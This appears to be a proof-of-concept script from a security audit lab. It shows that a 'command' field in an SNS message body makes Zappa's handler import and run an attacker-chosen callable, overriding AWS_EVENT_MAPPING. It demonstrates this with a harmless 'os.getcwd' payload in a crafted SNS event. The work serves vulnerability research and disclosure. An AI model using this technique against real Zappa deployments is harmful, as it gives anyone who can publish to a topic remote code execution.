#!/usr/bin/env python3
"""VULN-030 — SNS message-body `command` overrides AWS_EVENT_MAPPING (topic-publisher RCE).

Vulnerable code : targets/Zappa/zappa/handler.py:645-649 (get_function_for_aws_event, SNS branch)
                  sink via handler.py:942-953 (Records) -> utilities.py:146-153 import_and_get_function
Vulnerability   : CWE-94 Code Injection (event-data-controlled callable).
Surface         : B (SNS publisher) — reachable by anyone who can publish to a subscribed topic.

Mechanism (plain English)
-------------------------
When Zappa processes an SNS record it *first* honours a `command` field inside
the (publisher-controlled) message body, short-circuiting the admin mapping:

    if "Sns" in record:
        message = json.loads(record["Sns"]["Message"])
        if message.get("command"):
            return [message["command"]]          # <-- publisher chooses the callable
        arn = record["Sns"].get("TopicArn")
    ...
    value = self.settings.AWS_EVENT_MAPPING.get(arn)   # only reached if no body `command`

So a message body `{"command": "<dotted.path>"}` selects the function to import and
run, *overriding* `AWS_EVENT_MAPPING`. Any principal able to publish to the topic
(often broader than `lambda:InvokeFunction`) gains the VULN-002 import+invoke sink.

What a successful run proves
----------------------------
An SNS event whose message body carries `command` causes Zappa to import and run
that callable and return its result — even though `AWS_EVENT_MAPPING` is empty.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, log, raw_event, verdict

VULN = "VULN-030"


def main():
    banner(VULN, "SNS message-body command overrides AWS_EVENT_MAPPING",
           "zappa/handler.py:645-649 (SNS body command) -> import_and_get_function")

    # An SNS Records event. The lab's AWS_EVENT_MAPPING is empty ({}), so if the ARN
    # path were taken the handler would find no function. The message-body `command`
    # short-circuits that and chooses the callable itself.
    sns_event = {
        "Records": [
            {
                "EventSource": "aws:sns",
                "Sns": {
                    "TopicArn": "arn:aws:sns:us-east-1:000000000000:unmapped-topic",
                    "Message": json.dumps({"command": "os.getcwd"}),
                },
            }
        ]
    }
    log("STEP", 'publishing an SNS record with Message body {"command": "os.getcwd"} (topic is UNmapped)')
    r = raw_event(sns_event)
    result = r.get("result")
    log("INFO", f"handler returned = {result!r}")

    if isinstance(result, str) and result.startswith("/"):
        log("PROOF", f"the SNS message body selected and ran os.getcwd()={result!r} despite an empty "
                     f"AWS_EVENT_MAPPING — a topic publisher, not just a lambda:InvokeFunction holder, "
                     f"controls which code executes (feeds the VULN-002 sink).")
        log("OK", "exploit confirmed — SNS body `command` overrides the admin mapping")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — SNS message-body command -> import+invoke (topic-publisher RCE)")
        return 0
    log("FAIL", f"unexpected result {result!r}")
    verdict("FAILED", f"{VULN}: FAILED — SNS body command not honoured")
    return 1


if __name__ == "__main__":
    sys.exit(main())
